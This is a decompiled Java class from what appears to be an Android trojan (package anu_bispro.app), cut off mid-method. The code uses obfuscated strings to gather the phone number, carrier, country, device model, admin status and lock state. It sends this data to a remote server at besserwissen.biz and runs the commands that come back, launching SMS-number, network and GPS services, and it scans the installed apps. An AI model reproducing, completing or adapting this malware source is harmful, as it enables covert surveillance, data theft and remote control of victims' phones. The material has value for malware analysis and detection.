package anu_bispro.app;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import java.util.Iterator;

public class commands extends IntentService {
  Context a;
  
  a b = new a();
  
  d c = new d();
  
  public commands() {
    super(c.a("\013t\bl\013h"));
  }
  
  public void a() {
    // Byte code:
    //   0: aload_0
    //   1: ldc anu_bispro/app/gowhile
    //   3: invokespecial a : (Ljava/lang/Class;)Z
    //   6: ifne -> 24
    //   9: aload_0
    //   10: new android/content/Intent
    //   13: dup
    //   14: aload_0
    //   15: ldc anu_bispro/app/gowhile
    //   17: invokespecial <init> : (Landroid/content/Context;Ljava/lang/Class;)V
    //   20: invokevirtual startService : (Landroid/content/Intent;)Landroid/content/ComponentName;
    //   23: pop
    //   24: getstatic java/util/concurrent/TimeUnit.SECONDS : Ljava/util/concurrent/TimeUnit;
    //   27: ldc2_w 2
    //   30: invokevirtual sleep : (J)V
    //   33: new anu_bispro/app/b
    //   36: dup
    //   37: invokespecial <init> : ()V
    //   40: astore_1
    //   41: new anu_bispro/app/a
    //   44: dup
    //   45: invokespecial <init> : ()V
    //   48: astore_2
    //   49: aload_0
    //   50: ldc '}b\\bh'
    //   52: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   55: invokevirtual getSystemService : (Ljava/lang/String;)Ljava/lang/Object;
    //   58: checkcast android/telephony/TelephonyManager
    //   61: astore_3
    //   62: aload_2
    //   63: aload_0
    //   64: invokevirtual a : (Landroid/content/Context;)Ljava/lang/String;
    //   67: astore #4
    //   69: ldc ''
    //   71: astore #5
    //   73: getstatic android/os/Build$VERSION.SDK_INT : I
    //   76: bipush #23
    //   78: if_icmpge -> 1160
    //   81: new java/lang/StringBuilder
    //   84: dup
    //   85: invokespecial <init> : ()V
    //   88: iconst_0
    //   89: ldc '%'
    //   91: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   94: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   97: aload_3
    //   98: invokevirtual getNetworkOperatorName : ()Ljava/lang/String;
    //   101: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   104: ldc '$'
    //   106: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   109: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   112: aload_3
    //   113: invokevirtual getLine1Number : ()Ljava/lang/String;
    //   116: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   119: invokevirtual toString : ()Ljava/lang/String;
    //   122: astore #6
    //   124: getstatic android/os/Build$VERSION.RELEASE : Ljava/lang/String;
    //   127: astore #7
    //   129: new java/lang/StringBuilder
    //   132: dup
    //   133: invokespecial <init> : ()V
    //   136: iconst_0
    //   137: getstatic android/os/Build.MODEL : Ljava/lang/String;
    //   140: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   143: ldc 'F%'
    //   145: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   148: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   151: getstatic android/os/Build.PRODUCT : Ljava/lang/String;
    //   154: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   157: ldc '$'
    //   159: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   162: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   165: invokevirtual toString : ()Ljava/lang/String;
    //   168: astore #8
    //   170: aload_3
    //   171: invokevirtual getNetworkCountryIso : ()Ljava/lang/String;
    //   174: astore #9
    //   176: ldc '='
    //   178: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   181: pop
    //   182: aload_0
    //   183: ldc 'i{nRb\\ndt'
    //   185: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   188: invokevirtual getSystemService : (Ljava/lang/String;)Ljava/lang/Object;
    //   191: checkcast android/app/admin/DevicePolicyManager
    //   194: new android/content/ComponentName
    //   197: dup
    //   198: aload_0
    //   199: getfield a : Landroid/content/Context;
    //   202: ldc anu_bispro/app/DAR
    //   204: invokespecial <init> : (Landroid/content/Context;Ljava/lang/Class;)V
    //   207: invokevirtual isAdminActive : (Landroid/content/ComponentName;)Z
    //   210: ifne -> 1179
    //   213: ldc '='
    //   215: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   218: astore_3
    //   219: aload_0
    //   220: getfield a : Landroid/content/Context;
    //   223: astore #10
    //   225: aload_0
    //   226: ldc '\\rhjli'
    //   228: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   231: invokevirtual getSystemService : (Ljava/lang/String;)Ljava/lang/Object;
    //   234: checkcast android/app/KeyguardManager
    //   237: invokevirtual inKeyguardRestrictedInputMode : ()Z
    //   240: istore #11
    //   242: ldc '='
    //   244: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   247: pop
    //   248: iload #11
    //   250: iconst_1
    //   251: if_icmpne -> 1189
    //   254: ldc '='
    //   256: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   259: astore #10
    //   261: new java/lang/StringBuilder
    //   264: dup
    //   265: invokespecial <init> : ()V
    //   268: astore #12
    //   270: aload_0
    //   271: getfield c : Lanu_bispro/app/d;
    //   274: invokevirtual getClass : ()Ljava/lang/Class;
    //   277: pop
    //   278: aload_2
    //   279: aload_1
    //   280: aload #12
    //   282: iconst_0
    //   283: ldc 'http://besserwissen.biz'
    //   285: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   288: ldc 'I}dlhIyf9yfH}}'
    //   290: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   293: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   296: invokevirtual toString : ()Ljava/lang/String;
    //   299: new java/lang/StringBuilder
    //   302: dup
    //   303: invokespecial <init> : ()V
    //   306: iconst_0
    //   307: ldc '0'
    //   309: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   312: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   315: aload_2
    //   316: new java/lang/StringBuilder
    //   319: dup
    //   320: invokespecial <init> : ()V
    //   323: iconst_0
    //   324: aload #4
    //   326: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   329: ldc '7'
    //   331: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   334: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   337: aload_3
    //   338: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   341: ldc '7'
    //   343: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   346: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   349: aload #10
    //   351: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   354: invokevirtual toString : ()Ljava/lang/String;
    //   357: invokevirtual b : (Ljava/lang/String;)Ljava/lang/String;
    //   360: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   363: invokevirtual toString : ()Ljava/lang/String;
    //   366: invokevirtual a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   369: invokevirtual a : (Ljava/lang/String;)Ljava/lang/String;
    //   372: astore_3
    //   373: aload_3
    //   374: ldc 'C)q'
    //   376: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   379: invokevirtual contains : (Ljava/lang/CharSequence;)Z
    //   382: iconst_1
    //   383: if_icmpne -> 1200
    //   386: aload_0
    //   387: invokevirtual c : ()Ljava/lang/String;
    //   390: astore #10
    //   392: aload_0
    //   393: invokevirtual b : ()Ljava/lang/String;
    //   396: astore_3
    //   397: new java/lang/StringBuilder
    //   400: dup
    //   401: invokespecial <init> : ()V
    //   404: astore #12
    //   406: aload_0
    //   407: getfield c : Lanu_bispro/app/d;
    //   410: invokevirtual getClass : ()Ljava/lang/Class;
    //   413: pop
    //   414: aload #12
    //   416: iconst_0
    //   417: ldc 'http://besserwissen.biz'
    //   419: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   422: ldc '"{y"hRllH}}'
    //   424: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   427: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   430: invokevirtual toString : ()Ljava/lang/String;
    //   433: astore #13
    //   435: new java/lang/StringBuilder
    //   438: dup
    //   439: invokespecial <init> : ()V
    //   442: iconst_0
    //   443: ldc '0'
    //   445: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   448: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   451: astore #12
    //   453: new java/lang/StringBuilder
    //   456: dup
    //   457: invokespecial <init> : ()V
    //   460: iconst_0
    //   461: aload #4
    //   463: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   466: ldc '7'
    //   468: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   471: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   474: aload #6
    //   476: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   479: aload #5
    //   481: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   484: ldc '7'
    //   486: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   489: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   492: aload #7
    //   494: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   497: ldc '7'
    //   499: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   502: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   505: aload #9
    //   507: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   510: ldc '7'
    //   512: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   515: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   518: aload #10
    //   520: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   523: ldc '7'
    //   525: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   528: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   531: aload #8
    //   533: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   536: ldc '7'
    //   538: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   541: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   544: astore #5
    //   546: aload_0
    //   547: getfield c : Lanu_bispro/app/d;
    //   550: invokevirtual getClass : ()Ljava/lang/Class;
    //   553: pop
    //   554: aload_2
    //   555: aload_1
    //   556: aload #13
    //   558: aload #12
    //   560: aload_2
    //   561: aload #5
    //   563: ldc '1.6'
    //   565: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   568: ldc '7'
    //   570: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   573: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   576: aload_3
    //   577: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   580: invokevirtual toString : ()Ljava/lang/String;
    //   583: invokevirtual b : (Ljava/lang/String;)Ljava/lang/String;
    //   586: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   589: invokevirtual toString : ()Ljava/lang/String;
    //   592: invokevirtual a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   595: invokevirtual a : (Ljava/lang/String;)Ljava/lang/String;
    //   598: astore #5
    //   600: aload #5
    //   602: ldc '\7'
    //   604: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   607: invokevirtual split : (Ljava/lang/String;)[Ljava/lang/String;
    //   610: astore #5
    //   612: iconst_0
    //   613: istore #14
    //   615: iconst_0
    //   616: istore #15
    //   618: iload #14
    //   620: aload #5
    //   622: arraylength
    //   623: if_icmpge -> 1534
    //   626: aload #5
    //   628: iload #15
    //   630: aaload
    //   631: ldc '~lyc\\f0'
    //   633: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   636: invokevirtual contains : (Ljava/lang/CharSequence;)Z
    //   639: iconst_1
    //   640: if_icmpne -> 700
    //   643: aload_2
    //   644: aload_0
    //   645: getfield a : Landroid/content/Context;
    //   648: ldc '\\blh'
    //   650: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   653: invokevirtual a : (Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    //   656: ldc 'h'
    //   658: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   661: invokevirtual contains : (Ljava/lang/CharSequence;)Z
    //   664: ifne -> 700
    //   667: aload_2
    //   668: aload #5
    //   670: iload #15
    //   672: aaload
    //   673: ldc '~lyc\\f0'
    //   675: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   678: ldc 'h\\biyd\\bg'
    //   680: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   683: invokevirtual a : (Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   686: astore #6
    //   688: aload_2
    //   689: aload_0
    //   690: ldc '\\nbf9d\\bg'
    //   692: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   695: aload #6
    //   697: invokevirtual a : (Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    //   700: aload #5
    //   702: iload #15
    //   704: aaload
    //   705: ldc_w '^cR!B9^+^'
    //   708: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   711: invokevirtual contains : (Ljava/lang/CharSequence;)Z
    //   714: ifeq -> 1531
    //   717: aload_2
    //   718: aload #5
    //   720: iload #15
    //   722: aaload
    //   723: ldc_w 'c`h0'
    //   726: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   729: ldc_w 'yu0'
    //   732: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   735: invokevirtual a : (Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   738: astore_3
    //   739: aload #5
    //   741: iload #15
    //   743: aaload
    //   744: ldc_w 'yu0'
    //   747: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   750: invokevirtual split : (Ljava/lang/String;)[Ljava/lang/String;
    //   753: astore #6
    //   755: aload_2
    //   756: aload_0
    //   757: aload_3
    //   758: aload #6
    //   760: iconst_1
    //   761: aaload
    //   762: invokevirtual c : (Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    //   765: aload_0
    //   766: getfield c : Lanu_bispro/app/d;
    //   769: invokevirtual getClass : ()Ljava/lang/Class;
    //   772: pop
    //   773: new java/lang/StringBuilder
    //   776: astore #10
    //   778: aload #10
    //   780: invokespecial <init> : ()V
    //   783: aload #10
    //   785: iconst_0
    //   786: ldc '0'
    //   788: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   791: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   794: astore #10
    //   796: new java/lang/StringBuilder
    //   799: astore #7
    //   801: aload #7
    //   803: invokespecial <init> : ()V
    //   806: aload_1
    //   807: ldc_w 'http://besserwissen.biz/private/add_log.php'
    //   810: aload #10
    //   812: aload_2
    //   813: aload #7
    //   815: iconst_0
    //   816: aload #4
    //   818: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   821: ldc_w '%ѾьУ-чБч$FАјбѓэFv'
    //   824: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   827: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   830: aload_3
    //   831: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   834: ldc_w '-Ч-ФиќьФгњ-Fv'
    //   837: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   840: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   843: aload #6
    //   845: iconst_1
    //   846: aaload
    //   847: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   850: ldc_w '-јяљэіпѝићгGq'
    //   853: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   856: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   859: invokevirtual toString : ()Ljava/lang/String;
    //   862: invokevirtual b : (Ljava/lang/String;)Ljava/lang/String;
    //   865: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   868: invokevirtual toString : ()Ljava/lang/String;
    //   871: invokevirtual a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   874: pop
    //   875: aload_2
    //   876: aload_0
    //   877: getfield a : Landroid/content/Context;
    //   880: invokevirtual d : (Landroid/content/Context;)V
    //   883: aload #5
    //   885: iload #15
    //   887: aaload
    //   888: ldc_w 'c`$h6~!='
    //   891: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   894: invokevirtual contains : (Ljava/lang/CharSequence;)Z
    //   897: iconst_1
    //   898: if_icmpne -> 954
    //   901: new android/content/Intent
    //   904: dup
    //   905: aload_0
    //   906: ldc_w anu_bispro/app/getnum
    //   909: invokespecial <init> : (Landroid/content/Context;Ljava/lang/Class;)V
    //   912: ldc_w '~'
    //   915: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   918: ldc '='
    //   920: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   923: invokevirtual putExtra : (Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    //   926: ldc_w 'zRhy'
    //   929: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   932: ldc ''
    //   934: invokevirtual putExtra : (Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    //   937: astore #6
    //   939: aload #6
    //   941: ldc_w 268435456
    //   944: invokevirtual addFlags : (I)Landroid/content/Intent;
    //   947: pop
    //   948: aload_0
    //   949: aload #6
    //   951: invokevirtual startActivity : (Landroid/content/Intent;)V
    //   954: aload #5
    //   956: iload #15
    //   958: aaload
    //   959: ldc_w 'qh\\no\\tb\\rj\\tyu0'
    //   962: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   965: invokevirtual contains : (Ljava/lang/CharSequence;)Z
    //   968: iconst_1
    //   969: if_icmpne -> 1049
    //   972: aload_2
    //   973: aload #5
    //   975: iload #15
    //   977: aaload
    //   978: ldc_w 'qh\\no\\tb\\rj\\tyu0'
    //   981: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   984: ldc_w 'h\\bihyb\\tf'
    //   987: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   990: invokevirtual a : (Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   993: astore #6
    //   995: new android/content/Intent
    //   998: dup
    //   999: aload_0
    //   1000: ldc_w anu_bispro/app/getnum
    //   1003: invokespecial <init> : (Landroid/content/Context;Ljava/lang/Class;)V
    //   1006: ldc_w '~'
    //   1009: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1012: ldc_w '<'
    //   1015: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1018: invokevirtual putExtra : (Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    //   1021: ldc_w 'zRhy'
    //   1024: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1027: aload #6
    //   1029: invokevirtual putExtra : (Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    //   1032: astore #6
    //   1034: aload #6
    //   1036: ldc_w 268435456
    //   1039: invokevirtual addFlags : (I)Landroid/content/Intent;
    //   1042: pop
    //   1043: aload_0
    //   1044: aload #6
    //   1046: invokevirtual startActivity : (Landroid/content/Intent;)V
    //   1049: aload_2
    //   1050: aload_0
    //   1051: getfield a : Landroid/content/Context;
    //   1054: ldc_w 'cybf'
    //   1057: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1060: invokevirtual a : (Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    //   1063: astore_3
    //   1064: aload_2
    //   1065: aload_0
    //   1066: getfield a : Landroid/content/Context;
    //   1069: ldc_w 'j~'
    //   1072: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1075: invokevirtual a : (Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    //   1078: astore #6
    //   1080: aload_3
    //   1081: ldc 'h'
    //   1083: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1086: invokevirtual equals : (Ljava/lang/Object;)Z
    //   1089: ifeq -> 1108
    //   1092: aload_0
    //   1093: new android/content/Intent
    //   1096: dup
    //   1097: aload_0
    //   1098: ldc_w anu_bispro/app/NETWORK
    //   1101: invokespecial <init> : (Landroid/content/Context;Ljava/lang/Class;)V
    //   1104: invokevirtual startService : (Landroid/content/Intent;)Landroid/content/ComponentName;
    //   1107: pop
    //   1108: aload #6
    //   1110: ldc 'h'
    //   1112: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1115: invokevirtual equals : (Ljava/lang/Object;)Z
    //   1118: ifeq -> 1137
    //   1121: aload_0
    //   1122: new android/content/Intent
    //   1125: dup
    //   1126: aload_0
    //   1127: ldc_w anu_bispro/app/GPS
    //   1130: invokespecial <init> : (Landroid/content/Context;Ljava/lang/Class;)V
    //   1133: invokevirtual startService : (Landroid/content/Intent;)Landroid/content/ComponentName;
    //   1136: pop
    //   1137: iload #15
    //   1139: iconst_1
    //   1140: iadd
    //   1141: istore #14
    //   1143: iload #14
    //   1145: istore #15
    //   1147: goto -> 618
    //   1150: astore #5
    //   1152: aload #5
    //   1154: invokevirtual printStackTrace : ()V
    //   1157: goto -> 33
    //   1160: ldc_w 'NC)$'
    //   1163: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1166: astore #6
    //   1168: ldc_w 'D\\bikci'
    //   1171: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1174: astore #5
    //   1176: goto -> 124
    //   1179: ldc_w '<'
    //   1182: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1185: astore_3
    //   1186: goto -> 219
    //   1189: ldc_w '<'
    //   1192: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1195: astore #10
    //   1197: goto -> 261
    //   1200: aload_3
    //   1201: astore #5
    //   1203: aload_3
    //   1204: ldc_w '~lhWayj\\tyy'
    //   1207: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1210: invokevirtual contains : (Ljava/lang/CharSequence;)Z
    //   1213: iconst_1
    //   1214: if_icmpne -> 600
    //   1217: new java/lang/StringBuilder
    //   1220: dup
    //   1221: invokespecial <init> : ()V
    //   1224: astore #5
    //   1226: aload_0
    //   1227: getfield c : Lanu_bispro/app/d;
    //   1230: invokevirtual getClass : ()Ljava/lang/Class;
    //   1233: pop
    //   1234: aload_2
    //   1235: aload_1
    //   1236: aload #5
    //   1238: iconst_0
    //   1239: ldc 'http://besserwissen.biz'
    //   1241: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   1244: ldc_w '"{y"hyc~H}}'
    //   1247: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1250: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1253: invokevirtual toString : ()Ljava/lang/String;
    //   1256: new java/lang/StringBuilder
    //   1259: dup
    //   1260: invokespecial <init> : ()V
    //   1263: iconst_0
    //   1264: ldc '0'
    //   1266: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1269: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   1272: aload_2
    //   1273: aload #4
    //   1275: invokevirtual b : (Ljava/lang/String;)Ljava/lang/String;
    //   1278: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1281: invokevirtual toString : ()Ljava/lang/String;
    //   1284: invokevirtual a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   1287: invokevirtual a : (Ljava/lang/String;)Ljava/lang/String;
    //   1290: astore #5
    //   1292: aload #5
    //   1294: ldc '7'
    //   1296: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1299: invokevirtual split : (Ljava/lang/String;)[Ljava/lang/String;
    //   1302: astore #5
    //   1304: aload #5
    //   1306: iconst_0
    //   1307: aaload
    //   1308: ldc ''
    //   1310: invokevirtual equals : (Ljava/lang/Object;)Z
    //   1313: ifne -> 1327
    //   1316: aload #5
    //   1318: iconst_0
    //   1319: aaload
    //   1320: aconst_null
    //   1321: invokevirtual equals : (Ljava/lang/Object;)Z
    //   1324: ifeq -> 1339
    //   1327: aload_2
    //   1328: aload_0
    //   1329: ldc '\\nbf9d\\bg'
    //   1331: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1334: ldc ''
    //   1336: invokevirtual a : (Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    //   1339: new java/lang/StringBuilder
    //   1342: astore #6
    //   1344: aload #6
    //   1346: invokespecial <init> : ()V
    //   1349: ldc ''
    //   1351: aload #6
    //   1353: iconst_0
    //   1354: ldc ''
    //   1356: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   1359: aload #5
    //   1361: iconst_1
    //   1362: aaload
    //   1363: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1366: invokevirtual toString : ()Ljava/lang/String;
    //   1369: invokestatic e : (Ljava/lang/String;Ljava/lang/String;)I
    //   1372: pop
    //   1373: aload_2
    //   1374: aload_0
    //   1375: ldc_w 'lh9d\\bg'
    //   1378: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1381: aload #5
    //   1383: iconst_0
    //   1384: aaload
    //   1385: invokevirtual a : (Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    //   1388: aload_2
    //   1389: aload_0
    //   1390: ldc_w 'ia9~~'
    //   1393: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1396: aload #5
    //   1398: iconst_1
    //   1399: aaload
    //   1400: invokevirtual a : (Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    //   1403: aload_2
    //   1404: aload_0
    //   1405: ldc_w 'hh{y9~~'
    //   1408: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1411: aload #5
    //   1413: iconst_2
    //   1414: aaload
    //   1415: invokevirtual a : (Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    //   1418: aload_2
    //   1419: aload_0
    //   1420: ldc_w 'cybf'
    //   1423: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1426: aload #5
    //   1428: iconst_3
    //   1429: aaload
    //   1430: invokevirtual a : (Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    //   1433: aload_2
    //   1434: aload_0
    //   1435: ldc_w 'j~'
    //   1438: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1441: aload #5
    //   1443: iconst_4
    //   1444: aaload
    //   1445: invokevirtual a : (Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    //   1448: aload_3
    //   1449: astore #5
    //   1451: goto -> 600
    //   1454: astore #5
    //   1456: aload_3
    //   1457: astore #5
    //   1459: goto -> 600
    //   1462: astore #6
    //   1464: aload_0
    //   1465: getfield c : Lanu_bispro/app/d;
    //   1468: invokevirtual getClass : ()Ljava/lang/Class;
    //   1471: pop
    //   1472: aload_1
    //   1473: ldc_w 'http://besserwissen.biz/private/add_log.php'
    //   1476: new java/lang/StringBuilder
    //   1479: dup
    //   1480: invokespecial <init> : ()V
    //   1483: iconst_0
    //   1484: ldc '0'
    //   1486: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1489: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   1492: aload_2
    //   1493: new java/lang/StringBuilder
    //   1496: dup
    //   1497: invokespecial <init> : ()V
    //   1500: iconst_0
    //   1501: aload #4
    //   1503: invokevirtual insert : (ILjava/lang/String;)Ljava/lang/StringBuilder;
    //   1506: ldc_w 'qNЕЧшFЬѺЬO-ѸхўмќнFьFгФвЦнєзјдFЬѺЬJ-єгёбјлћгFаѓяFвЦнє-ђжЩ-јяљэіпќеGq'
    //   1509: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
    //   1512: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1515: invokevirtual toString : ()Ljava/lang/String;
    //   1518: invokevirtual b : (Ljava/lang/String;)Ljava/lang/String;
    //   1521: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1524: invokevirtual toString : ()Ljava/lang/String;
    //   1527: invokevirtual a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   1530: pop
    //   1531: goto -> 883
    //   1534: return
    // Exception table:
    //   from	to	target	type
    //   24	33	1150	java/lang/InterruptedException
    //   755	883	1462	java/lang/Exception
    //   1292	1327	1454	java/lang/Exception
    //   1327	1339	1454	java/lang/Exception
    //   1339	1448	1454	java/lang/Exception
  }
  
  public String b() {
    Iterator<ApplicationInfo> iterator = getPackageManager().getInstalledApplications(128).iterator();
    boolean bool1 = false;
    boolean bool2 = false;
    boolean bool3 = false;
    boolean bool4 = false;
    boolean bool5 = false;
    boolean bool6 = false;
    boolean bool7 = false;
    boolean bool8 = false;
    boolean bool9 = false;
    boolean bool10 = false;
    boolean bool11 = false;
    boolean bool12 = false;
    boolean bool13 = false;
    while (iterator.hasNext()) {
